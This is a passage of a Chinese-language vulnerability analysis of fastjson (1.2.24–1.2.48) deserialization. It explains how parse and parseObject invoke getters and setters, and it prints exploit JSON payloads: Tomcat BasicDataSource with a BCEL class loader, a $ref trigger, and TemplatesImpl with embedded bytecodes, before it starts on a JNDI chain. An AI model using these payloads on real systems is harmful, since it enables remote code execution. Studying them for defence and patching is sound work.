\u7684 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u5373\u53ef \uff0c \u8fd9\u91cc \u63d0 \u4e00\u4e0b \u5c06 ASM \u52a8\u6001 \u751f\u6210 \u7684 \u4ee3\u7801 dump \u51fa\u6765 \u7684 \u65b9\u6cd5   \u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c ASM \u52a8\u6001 \u751f\u6210 \u4e86 \u76f8\u5e94 \u7684 bytecodes \uff0c \u8fd9\u91cc \u7528 idea \u7684 \u65ad\u70b9 \u6765 dump \u6e90\u7801   \u5148 \u5c06 \u65ad\u70b9 \u4e0b \u5728   com / alibaba / fastjson / parser / deserializer / ASMDeserializerFactory . java # 80   \u751f\u6210 \u7684 bytecodes \u5728 code \u91cc \uff0c \u7528 \u6267\u884c \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u529f\u80fd \uff0c \u6267\u884c   ( new   FileOutputStream ( \" some . class \" ) ) . write ( code )   \u5373\u53ef \u751f\u6210   ( 3 ) .   fastjson   \u81ea\u52a8 \u8c03\u7528 getter \u548c setter   \u7c7b\u4f3c Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4f1a \u81ea\u52a8 \u8c03\u7528 readObject \u51fd\u6570 \uff0c fastjson \u8fd8\u539f \u5bf9\u8c61 \u65f6 \u4e5f \u4f1a \u81ea\u52a8 \u8c03\u7528 \u4ee5\u4e0b \u51e0\u4e2a \u51fd\u6570 \uff1a   \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u51fd\u6570   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter \u51fd\u6570   \u8fd9\u91cc \u9700\u8981 \u533a\u522b \u7684 \u662f fastjson \u6240 \u4f7f\u7528 \u7684 parse \u51fd\u6570 \u548c parseObject \u51fd\u6570 \u6240 \u8c03\u7528 \u7684 \u51fd\u6570 \u6761\u4ef6 \u662f \u4e0d \u4e00\u6837 \u7684 \u3002 \uff08 ps \uff1a \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6\u4f1a \u8c03\u7528 \u6240\u6709 getters \uff09   1 .   parse   \u548c   parseObject \u7684 \u533a\u522b   \u6765\u770b \u4e00\u4e0b parseObject \u51fd\u6570   \u8fd9\u91cc parseObject \u51fd\u6570 \u4f1a \u9996\u5148 \u8c03\u7528   JSON . parse   \u51fd\u6570 \uff0c \u7136\u540e \u518d \u53bb \u8c03\u7528   toJSON   \u51fd\u6570 \u3002   \u8fd9\u91cc   toJSON   \u4f1a \u628a obj \u5957 \u4e00\u5c42   JSONObject   \u5bf9\u8c61 \uff0c \u4ed6 \u7684 \u5b9e\u73b0 \u65b9\u6cd5 \u662f \u5148 new \u4e00\u4e2a   JSONObject   \uff0c \u628a obj \u5bf9\u8c61 \u7ed9 \u586b\u5145 \u8fdb\u53bb \uff1b \u7136\u540e \u8c03\u7528   toJSONString   \u628a \u751f\u6210 \u7684   JSONObject   \u8f6c\u5316 \u4e3a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff1b \u6700\u540e \u518d \u8c03\u7528   parse   \u51fd\u6570 \u5c06 \u8fd9\u4e2a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7ed9 \u8fd8\u539f \u3002   \u8fd9\u91cc \u7684   toJSONString   \u662f \u6211\u4eec \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e00\u4e2a \u8fc7\u7a0b \uff0c \u4ed6\u4f1a \u53bb \u8c03\u7528 \u8fd9\u4e2a \u5bf9\u8c61 \u7684 \u6240\u6709 getters \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740   parseObject   \u51fd\u6570 \u4f1a \u4e3b\u52a8 \u53bb \u8c03 getters \u548c setters \uff0c \u800c   parse   \u51fd\u6570 \u5219 \u4f1a \u8c03\u7528 \u8fd9\u4e2a \u5bf9\u8c61 \u7684 setters \u548c \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters ( \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u89c1 \u540e\u6587 ) \u3002   \u90a3\u4e48 \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \uff0c   parseObject   \u6bd4   parse   \u51fd\u6570 \u591a \u4e86 \u4e00\u4e2a \u8c03\u7528 \u6240\u6709 getters \u7684 \u5229\u7528 \u70b9 \u3002   2 .   parse \u81ea\u52a8 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u4e3b\u8981 \u903b\u8f91   \u63a5\u7740 \u6211\u4eec \u6765\u770b \u4e00\u4e0b   JSON . parse   \u51fd\u6570 \u81ea\u52a8 \u8c03\u7528 getters \u548c setters \u7684 \u903b\u8f91 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b \u8c03\u7528 \u6d41\u7a0b \uff0c \u4ee5\u4e0b \u5206\u6790 fastjson \u7248\u672c 1.2 . 24   com / alibaba / fastjson / parser / deserializer / JavaBeanDeserializer . java # deserialze   \uff08 ps \uff1a \u8fd9\u91cc \u5f88 \u9e21 \u8d3c \u7684 \u628a deserialize \u7684 i \u7ed9 \u7701\u7565 \u4e86 \uff09   \u9996\u5148 \u662f \u7b2c 570 \u884c \u8c03\u7528 \u4e86 createInstance \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u5c06\u4f1a \u5bf9 \u5f53\u524d \u8fd8\u539f \u7684 \u7c7b \u8fdb\u884c \u5b9e\u4f8b \u5316 \uff0c \u8fd9\u91cc \u4f1a \u81ea\u52a8 \u8c03\u7528 \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u5176\u6b21 \u662f \u7b2c 600 \u884c \u8c03\u7528 \u4e86 parseField \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u5c06 \u5bf9 \u6bcf\u4e2a \u7c7b \u5c5e\u6027 \u8fdb\u884c \u521d\u59cb \u521d\u59cb\u5316 ( \u6216 \u9012\u5f52 \u751f\u6210 \u65b0 \u7684 \u5bf9\u8c61 )   \u8ddf\u8fdb parseField \u51fd\u6570   \u8fd9\u91cc \u8c03\u7528 \u4e86   com / alibaba / fastjson / parser / deserializer / DefaultFieldDeserializer . java # parseField   \u51fd\u6570 \uff0c \u76f4\u63a5 \u770b \u5173\u952e \u5173\u952e\u70b9 \u7b2c 83 \u884c \uff0c \u8c03\u7528 \u4e86 setValue \u51fd\u6570   setValue \u51fd\u6570 \u5c31\u662f fastjson \u81ea\u52a8 \u8c03\u7528 getter \u548c setter \u7684 \u5173\u952e \u5173\u952e\u70b9   \u5982\u679c \u4e0d \u5b58\u5728 \u76f8\u5e94 \u7684 getter \u3001 setter \u3001 is \u51fd\u6570 \uff0c \u5219 \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u5c06 value \u8d4b\u503c \u5230 \u5f53\u524d \u7684 object \u4e0a \uff08 \u8fd9\u91cc \u5c31\u662f else \u90e8\u5206 \u505a \u7684 \u4e8b\u60c5 \uff09 \u3002   \u800c \u5f53 fieldInfo \u5b58\u5728 \u51fd\u6570 \u65f6 \uff0c \u5982\u679c \u540c\u65f6 \u5b58\u5728 getter \u548c setter \uff0c \u5219 \u8c03\u7528 setter \uff0c \u5982\u679c \u53ea \u5b58\u5728 getter \u5219 \u8c03\u7528 getter \u3002   \u8fd9\u91cc \u6211\u4eec \u5173\u6ce8 \u4e00\u4e0b fieldInfo \u7684 method \u662f \u600e\u4e48 \u586b\u5145 \u7684 \u5462 \uff1f \u8fd9\u91cc \u8981 \u770b   com / alibaba / fastjson / util / JavaBeanInfo . java # build   \u51fd\u6570 \uff0c ParserConfig \u5728   createJavaBeanDeserializer   \u51fd\u6570 \u4e2d \u4f1a \u8c03\u7528   JavaBeanInfo . build   \u51fd\u6570 \uff0c \u4ee5\u6b64 \u586b\u5145 fieldInfo \uff0c \u4e5f \u5c31\u662f \u6211\u4eec \u9700\u8981 \u5206\u6790 \u7684 \u51e0\u4e2a method \u3002   \u4e0d\u770b \u5177\u4f53 \u7684 \u4ee3\u7801 \uff0c \u5199 \u4e00\u4e0b \u7b5b\u9009 \u7684 \u6761\u4ef6 \uff1a   setter \u63d0\u53d6 \u6761\u4ef6 \uff1a   \u51fd\u6570 \u540d \u957f\u5ea6 \u5927\u4e8e \u7b49\u4e8e 4   \u975e \u9759\u6001 \u51fd\u6570   \u9650\u5236 \u8fd4\u56de \u7c7b\u578b \u4e3a void \u6216 \u5f53\u524d \u7c7b   \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u53ea\u6709 \u4e00\u4e2a   \u51fd\u6570 \u540d\u4ee5 set \u5f00\u5934 \uff0c \u7b2c\u56db \u56db\u4e2a \u7b2c\u56db\u4e2a \u5b57\u7b26 \u662f \u5927\u5199 \u6216\u8005   unicde   \u6216\u8005   _   \u6216\u8005 \u5b57\u6bcd f \uff1b \u5982\u679c \u51fd\u6570 \u540d \u957f\u5ea6 > = 5 \uff0c \u770b \u7b2c 5 \u4f4d \u5b57\u7b26 \u4e0d\u662f \u662f\u4e0d\u662f \u5927\u5199 \u7684   getter \u63d0\u53d6 \u6761\u4ef6 \uff1a   \u51fd\u6570 \u540d \u957f\u5ea6 \u5927\u4e8e \u7b49\u4e8e 4   \u975e \u9759\u6001 \u51fd\u6570   \u51fd\u6570 \u540d\u4ee5 get \u5f00\u5934 \uff0c \u7b2c\u56db \u56db\u4e2a \u7b2c\u56db\u4e2a \u5b57\u7b26 \u5927\u5199   \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e3a 0 \u4e2a   \u51fd\u6570 \u7684 \u8fd4\u56de \u7c7b\u578b \u4e3a Collection \u7684 \u5b50\u7c7b \u6216 \u672c\u8eab \u3001 Map \u7684 \u5b50\u7c7b \u6216 \u672c\u8eab \u3001 AtomicBoolean \u3001 AtomicInteger \u3001 AtomicLong   \u65e0 \u76f8\u5bf9 \u5e94 \u7684 setter \u51fd\u6570   \u7ecf\u8fc7 \u4e0a\u8ff0 \u7684 \u4e24\u4e2a \u6761\u4ef6 \u63d0\u53d6 \u540e \uff0c \u4fdd\u7559 \u4e86 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u548c setter \uff0c \u5e76 \u4e8e   com / alibaba / fastjson / parser / deserializer / FieldDeserializer . java # setValue   \u51fd\u6570 \u4e2d invoke \u8c03\u7528 \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4 \u5b9e\u73b0 \u4e86 \u7c7b\u4f3c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4e3b\u52a8 \u8c03\u7528 readObject \u51fd\u6570 \u7684 \u6548\u679c \u3002   \u77e5\u9053 \u4e86 \u4e0a\u8ff0 \u7684 \u6761\u4ef6 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u4f20\u5165 \u67d0\u5b57 \u6bb5 \u7684 \u65b9\u5f0f \u6765 \u4e3b\u52a8 \u8c03\u7528 \u76f8\u5173 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter \u548c getter \u3002 \u4f8b\u5982 \u5728 Person \u91cc\u9762 \u6dfb\u52a0 \u4e00\u4e2a setTest \u51fd\u6570 \uff0c \u5e76 \u5728 \u9700\u8981 \u8f6c\u5316 \u7684 json \u4e2d \u6dfb\u52a0   \" test \" : 1   \uff0c \u5c06\u4f1a \u4e3b\u52a8 \u8c03\u7528   setTest   \u3002   \u6211\u4eec \u5728 \u5229\u7528   @ type   \u6784\u9020 \u6709 \u5371\u5bb3 \u7684 \u5229\u7528 \u94fe\u65f6 \uff0c \u4e3b\u8981 \u5c31\u662f \u67e5\u627e \u6709 \u5371\u5bb3 \u7684 \u65e0 \u53c2\u6570 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3001 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter \u548c setter \u3002   3 .   \u7a81\u7834 parse \u4e0d\u80fd \u8c03\u7528 \u6240\u6709 getters \u7684 \u9650\u5236   \u8fd9\u91cc \u7684 \u7a81\u7834 \u601d\u8def \u4e3b\u8981 \u6709 \u4e24\u4e2a \uff1a   tomcat   bcel \u7684 poc   threedream \u5e08\u5085 \u53d1\u73b0 \u7684   \u5f15\u7528   \u7684 \u65b9\u5f0f   \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \uff1a Tomcat   BCEL   POC \u601d\u8def   \u8fd9\u4e2a poc \u5de7\u5999 \u7684 \u5229\u7528 \u4e86   JSONObject . toString   \u51fd\u6570 \uff0c \u5148 \u6765 \u770b\u770b \u8fd9\u4e2a   toString   \u8fd9\u4e2a   toString   \u7ee7\u627f \u81ea   JSON   \u8fd9\u91cc \u4ed6 \u76f4\u63a5 \u8c03\u7528 \u4e86   toJSONString   \u51fd\u6570   \u770b\u5230 \u540e\u7eed \u4ed6 \u5c06 \u5f53\u524d \u8fd9\u4e2a JSONObject \u5b9e\u4f8b \u8fdb\u884c \u4e86 obj   to   str \u7684 \u64cd\u4f5c \uff0c \u4e5f \u5c31\u662f \u6211\u4eec \u4f7f\u7528 \u9759\u6001 \u51fd\u6570   JSON . toJSONString   \u6765 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u4e00\u6837 \uff0c \u8fd9\u91cc \u5c06\u4f1a \u8c03\u7528 \u5f53\u524d \u8fd9\u4e2a \u7c7b \u7684 \u6240\u6709 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters \uff08 \u8fd9\u91cc \u7684 \u6761\u4ef6 \u6bd4 \u8c03\u7528 parse \u65f6 \u5bbd\u677e \uff0c \u4ed6 \u5bf9 \u8fd4\u56de \u7c7b\u578b \u65e0 \u9650\u5236 \uff09 \u3002   \u90a3\u4e48 \u6211\u4eec \u53ea\u8981 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \uff0c \u627e\u5230 \u4e00\u5904 \u53ef\u4ee5 \u4f7f\u7528 JSONObject \u8c03\u7528 toString \u7684 \u5730\u65b9 \u5c31 \u53ef\u4ee5 \u4e86   com / alibaba / fastjson / parser / DefaultJSONParser . java # parseObject   \u8fd9\u91cc \u6709 \u4e00\u5904 \u5982\u679c \u5f53\u524d object \u4e3a JSONObject \u7c7b\u578b \u65f6 \uff0c \u5c06\u4f1a \u5bf9 \u5f53\u524d \u7684 \u8fd9\u4e2a key \u8c03\u7528   toString   \u51fd\u6570 \u3002 \u8fd9\u91cc \u5728 \u5904\u7406 \u7406\u8fc7 \u8fc7\u7a0b \u5904\u7406\u8fc7\u7a0b \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u5982\u679c \u9047\u5230   {   \uff0c fastjson \u4f1a\u52a0 \u4e00\u5c42 JSONObject \u3002   \u90a3\u4e48 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u6784\u9020 \u4e00\u4e2a \u7c7b\u4f3c   { {   some   } :   x   }   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u6b64\u65f6 \u7684 key \u4e3a   { }   ( \u4e5f \u5c31\u662f \u4e0b \u4e00\u5c42 \u7684 JSONObject ) \uff0c value \u4e3a   x   \u3002 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u4f7f\u5f97 fastjson \u53bb \u8c03\u7528   key . toString   \u51fd\u6570 \uff0c \u8fd9\u4e2a   toString   \u7684 \u8fc7\u7a0b \u4e5f \u5c31\u662f \u5c06 key \u8c03\u7528   toJSONString   \u7684 \u8fc7\u7a0b \uff0c \u610f\u5473 \u610f\u5473\u7740 \u5c06\u4f1a \u8c03\u7528 \u5f53\u524d key \u5bf9\u8c61 \u7684 \u6240\u6709 getters \u3002 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u53ef\u4ee5 \u4f7f parse \u51fd\u6570 \u62e5\u6709 \u4e0e parseObject \u4e00\u6837 \u7684 \u6267\u884c \u6548\u679c \uff0c \u4ee5 \u4e0b\u9762 \u7684 poc \u4e3a\u4f8b \u3002   {   / /   \u7b2c\u4e00 \u4e00\u5c42 \u7b2c\u4e00\u5c42 JSONObject \uff0c \u4ed6 \u7684 key \u4e3a \u53e6\u5916 \u4e00\u4e2a JSONObject   {   / /   \u4e0b \u4e00\u5c42 JSONObject \uff0c \u4ed6 \u7684 \u5185\u5bb9 \u5c06\u4f1a \u8c03\u7528 toJSONString   \" x \"   : {   / /   \u5177\u4f53 \u89e6\u53d1 \u70b9\u4e3a getConnection   \" @ type \"   :   \" org . apache . tomcat . dbcp . dbcp . BasicDataSource \"   ,   \" driverClassLoader \"   :   {   \" @ type \"   :   \" com . sun . org . apache . bcel . internal . util . ClassLoader \"   } ,   \" driverClassName \"   :   \" $ $ BCEL $ $ $ l $ 8b $ I $ A $ ... \"   }   } :   \" x \"   }   ;   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff1a   $ ref   \u70b9   \u5f53 fastjson \u7248\u672c > = 1.2 . 36 \u65f6 \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u7528   $ ref   \u7684 \u65b9\u5f0f \u6765 \u8c03\u7528 \u4efb\u610f \u7684 getter   \u4ee5 1.2 . 48 \u7248\u672c \u4e3a\u4f8b \uff0c \u9996\u5148 \u770b \u4e00\u4e0b \u9047\u5230   $ ref   \u662f \u600e\u4e48 \u5904\u7406 \u7684   com . alibaba . fastjson . parser . DefaultJSONParser # parseObject # 388   \u5f53 \u9047\u5230 \u5f15\u7528   $ ref   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u4f1a \u589e\u52a0 \u4e00\u4e2a resolveTask \uff0c \u7559\u5728 parse \u7ed3\u675f \u540e \u8fdb\u884c \u5904\u7406   com . alibaba . fastjson . parser . DefaultJSONParser # handleResovleTask   \u8c03\u7528   JSONPath . eval   \uff0c \u5173\u4e8e JSONPath \u7684   \u4ecb\u7ecd   \u8fd9\u91cc \u7684 eval \u51fd\u6570 \u6700\u7ec8 \u4f1a \u53bb \u8c03\u7528   JSONPath . getPropertyValue   \u51fd\u6570 \uff08 \u8fd9\u91cc \u5176\u5b9e \u662f \u53ef\u4ee5 \u6839\u636e \u6211\u4eec \u4f20\u5165 \u7684 \u5185\u5bb9 \u53bb \u8c03\u7528 \u4e0d\u540c \u7684 Segement \uff0c \u6bd4\u5982 \u8fd9\u91cc \u7528 \u4e86   $ . value   \u7684 \u65b9\u5f0f \u4f7f\u7528 \u7684 \u662f PropertySegement \uff09   \u540e\u7eed \u5c31 \u4e0d \u8be6\u7ec6 \u7ec6\u5206 \u5206\u6790 \u8be6\u7ec6\u5206\u6790 \u4e86 \uff0c \u8fd9\u91cc \u5982\u679c \u5b58\u5728 \u76f8\u5e94 \u7684 getter \uff0c \u5c31 \u4f1a \u53bb invoke \u8fd9\u4e2a \u51fd\u6570 \uff1b \u5982\u679c \u6ca1\u6709 \uff0c \u90a3\u4e48 \u4f1a\u7528 \u5c31\u4f1a\u7528 \u53cd\u5c04 \u673a\u5236 \u53bb \u83b7\u53d6 \u5c5e\u6027 \u7684 \u503c \u3002   \u8fd9\u91cc \u4e3e\u4e2a \u4f8b\u5b50   json   =   \" { \"   +   \" \\ \" @ type \\ \" :   \\ \" org . apache . tomcat . dbcp . dbcp . BasicDataSource \\ \" , \"   +   \" \\ \" driverClassLoader \\ \" :   { \\ \" @ type \\ \" :   \\ \" com . sun . org . apache . bcel . internal . util . ClassLoader \\ \" } , \"   +   \" \\ \" driverClassName \\ \" :   \\ \" $ $ BCEL $ $ $ l $ 8b $ I $ A $ ... \\ \" , \"   +   \" \\ \" connection \\ \" : { \\ \" $ ref \\ \" :   \\ \" $ . connection \\ \" } \"   +   \" } \"   ;   \u4f1a \u53bb \u8c03\u7528   getConnection   \u51fd\u6570 \uff0c \u8fd9\u91cc \u4e5f \u7a81\u7834 \u4e86 parse \u5230 parseObject \u7684 \u6548\u679c   ( 4 ) .   private \u5c5e\u6027   \u8fd8\u6709 \u4e00\u70b9 \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u9ed8\u8ba4 fastjon \u5728 \u8f6c\u5316 \u65f6 \uff0c \u5982\u679c \u6ca1\u6709 setter \u51fd\u6570 \uff0c \u800c\u662f \u4ee5 \u53cd\u5c04 \u673a\u5236 \u6765 \u8d4b\u503c \u7684 \u60c5\u51b5 \uff0c \u4f1a \u5ffd\u7565 private \u5c5e\u6027 \u7684 \u8f6c\u5316 \u3002 \u610f\u5473 \u610f\u5473\u7740 \u5982\u679c \u6211\u4eec \u5728 \u6784\u9020 \u8fc7\u7a0b \u4e2d \uff0c \u586b\u5145 \u8fdb\u53bb \u7684 \u5c5e\u6027 \u662f private \u7684 \u4e14 \u6ca1\u6709 setter \uff0c \u90a3\u4e48 \u5728 \u8f6c\u5316 \u8fc7\u7a0b \u4e2d\u662f \u4e0d\u4f1a \u88ab \u586b\u5165 \u8fd8\u539f \u540e \u7684 \u5bf9\u8c61 \u7684 \u3002 \u5982\u679c \u9700\u8981 \u5bf9 private \u5c5e\u6027 \u8fdb\u884c \u8f6c\u5316 \uff0c \u90a3\u4e48 \u9700\u8981 \u8bbe\u7f6e   Feature . SupportNonPublicField   0x02   EXP \u5206\u6790   \u76f8\u6bd4 \u4e8e Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6784\u9020 \u7684 \u590d\u6742 \u590d\u6742\u6027 \uff0c fastjson \u5229\u7528 \u94fe \u4e3b\u8981 \u662f \u5bfb\u627e \u53ef \u5229\u7528 \u7684 getter \u3001 setter \u7b49 \uff0c \u5e38\u89c1 \u7684 \u51e0\u79cd POC \u5982\u4e0b \u6587 \u6240\u793a \uff1a   ( 1 ) .   templatesimpl   \u53c2\u8003 \uff1a   http : / / xxlegend . com / 2017 / 05 / 03 / title -% 20fastjson% 20% E8% BF% 9C% E7% A8% 8B% E5% 8F% 8D% E5% BA% 8F% E5% 88% 97% E5% 8C% 96poc% E7% 9A% 84% E6% 9E% 84% E9% 80% A0% E5% 92% 8C% E5% 88% 86% E6% 9E% 90 /   \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u9700\u8981 \u627e\u5230 \u53ef\u4ee5 \u5229\u7528 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3001 setter \u6216 getter \u51fd\u6570 \u3002 \u5728 \u5206\u6790 Commons - Collections \u7cfb\u7edf \u7684 \u5229\u7528 \u94fe\u65f6 \uff0c \u63d0\u5230 \u8fc7 templatesimpl \u7684 \u6267\u884c \u65b9\u5f0f \uff0c \u901a\u8fc7 \u8f7d\u5165 bytecodes \u7684 \u65b9\u5f0f \u6765 \u8fbe\u5230 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6548\u679c ( \u5177\u4f53 \u4e0d\u518d \u5206\u6790 ) \u3002   \u5176\u4e2d \u89e6\u53d1 \u8f7d\u5165 \u7684 \u51fd\u6570 \u4e3a   newTransformer   \u51fd\u6570 \uff0c \u800c \u5f88\u5de7 \u7684 \u662f \uff0c templatesimpl \u5b58\u5728 \u4e00\u4e2a getter \u8c03\u7528 \u4e86 \u8be5 \u51fd\u6570   \u90a3\u4e48 \u5f88 \u660e\u663e \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u586b\u5165   outputProperties   \u7684 \u65b9\u6cd5 \u6765 \u89e6\u53d1   getOutputProperties   \uff08 \u4ed6 \u6070\u5de7 \u65e0 setter \uff0c \u8fd4\u56de \u8fd4\u56de\u503c \u4e5f \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \uff09 \u3002 \u4f46\u662f \u6709 \u4e00\u4e2a \u95ee\u9898 \u662f \u6211\u4eec \u9700\u8981 \u586b\u5145 \u7684 \u7c7b \u5c5e\u6027 \u90fd \u662f private \u7c7b\u578b \uff0c \u8981 \u60f3 \u6267\u884c \u8be5 \u5229\u7528 \u94fe \uff0c \u9700\u8981 \u5728 \u8c03\u7528 parseObject \u51fd\u6570 \u65f6 \u586b\u5165   Feature . SupportNonPublicField   \u3002 \u4ee5\u4e0b \u56fe\u4e3a\u4f8b \uff0c \u5c06 \u8c03\u7528 \u8ba1\u7b97 \u7b97\u5668 \u8ba1\u7b97\u5668   String   jsonString   =   \" { \\ \" @ type \\ \" : \\ \" com . sun . org . apache . xalan . internal . xsltc . trax . TemplatesImpl \\ \" , \"   +   \" \\ \" _ name \\ \" : \\ \" goodjob \\ \" , \\ \" _ tfactory \\ \" : { } , \"   +   \" \\ \" _ bytecodes \\ \" : [ \\ \" yv66vgAAADQAOgoAA ... \\ \" ] , \"   +   \" \\ \" _ outputProperties \\ \" : null } \"   ;   \u8fd9\u91cc \u7684 bytecodes \u53ef\u4ee5 \u7528 ysoserial \u5de5\u5177 \u6765 \u751f\u6210 \u3002 \u5728 \u6784\u9020 payload \u7684 \u65f6\u5019 \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f   _ tfactory   \u5fc5\u987b \u586b \u4e0a \uff0c \u56e0\u4e3a \u5728 \u6267\u884c \u8fc7\u7a0b \u4e2d \uff0c \u5982\u679c \u5b83 \u4e3a null \uff0c \u4f1a \u62a5\u9519 \u65e0\u6cd5 \u8fdb\u5165 \u8f7d\u5165 bytecodes \u7684 \u6b65\u9aa4 \u3002 \u975e\u5e38 \u597d \u7684 \u662f \uff0c \u6211\u4eec \u53ea\u8981 \u586b \u4e0a   _ tfactory : { }   \uff0c fastjson \u4f1a \u81ea\u52a8 \u5e2e \u6211\u4eec \u8c03\u7528 TransformerFactoryImpl \uff08 _ tfactory \u7684 \u7c7b \uff09 \u7684 \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u8fdb\u884c \u5b9e\u4f8b \u5316 \u3002   \\ _   \u5728 smartMatch \u51fd\u6570 \u88ab \u66ff\u6362 \u4e3a\u7a7a \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c byte [ ] \u7c7b\u578b \u5728 fastjson \u8f6c\u5316 \u4e2d\u4f1a \u88ab base64 \u7f16\u7801   \u6240\u4ee5 payload \u4e2d\u662f \u957f\u4e32 \u4e00\u957f\u4e32 base64 \u7684 \u5b57\u4e32 \u3002   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u4e2a poc \u5176\u5b9e \u9650\u5236 \u8fd8\u662f \u633a\u5927 \u7684 \uff0c \u9700\u8981 fastjson   parseObject \u586b\u4e0a \u65f6\u586b\u4e0a   Feature . SupportNonPublicField   \u624d \u53ef\u4ee5 \u3002   ( 2 ) .   \u57fa\u4e8e JNDI \u7684 \u5229\u7528   \u6211\u4eec \u90fd \u77e5\u9053 \u5982\u679c JNDI \u7684 lookup \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u503c \u53ef\u63a7 \uff0c \u90a3\u4e48 \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 JNDI   Reference \u7684 \u65b9\u6cd5 \u52a0\u8f7d \u8fdc\u7a0b \u4ee3\u7801 \u8fbe\u6210 RCE \u5229\u7528 \u3002 \u6240\u4ee5 \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u5728   \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u3001   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setter   \u3001   \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getter   \u91cc \u53d1\u73b0 \u4e00\u4e2a \u53ef\u63a7 \u7684 lookup \u51fd\u6570 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5229\u7528 JNDI \u7684 \u6ce8\u5165 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002   JdbcRowSetImpl   JdbcRowSetImpl \u5bf9\u8c61 \u53ef\u4ee5 \u88ab \u6211\u4eec \u7528\u505a \u4e0a\u8ff0 \u7684 \u5229\u7528 \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 \u4ee3\u7801   \u8fd9\u6b21 \u51fa \u95ee\u9898 \u7684 \u5730\u65b9 \u5728\u4e8e setAutoCommit \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 connect \u51fd\u6570 \u6765 \u91cd\u65b0 \u53d1\u8d77 \u4e00\u4e2a jdbc \u7684 \u8fde\u63a5   \u5728 connect \u51fd\u6570 \u91cc \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u8c03\u7528 \u4e86 lookup \u51fd\u6570 \uff0c \u5176 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u7531   getDataSourceName   \u6765 \u83b7\u53d6 \uff0c \u8be5 \u51fd\u6570 \u4e3b\u8981 \u8fd4\u56de \u5c5e\u6027   dataSource   \uff0c \u6839\u636e fastjson \u7684 \u5229\u7528 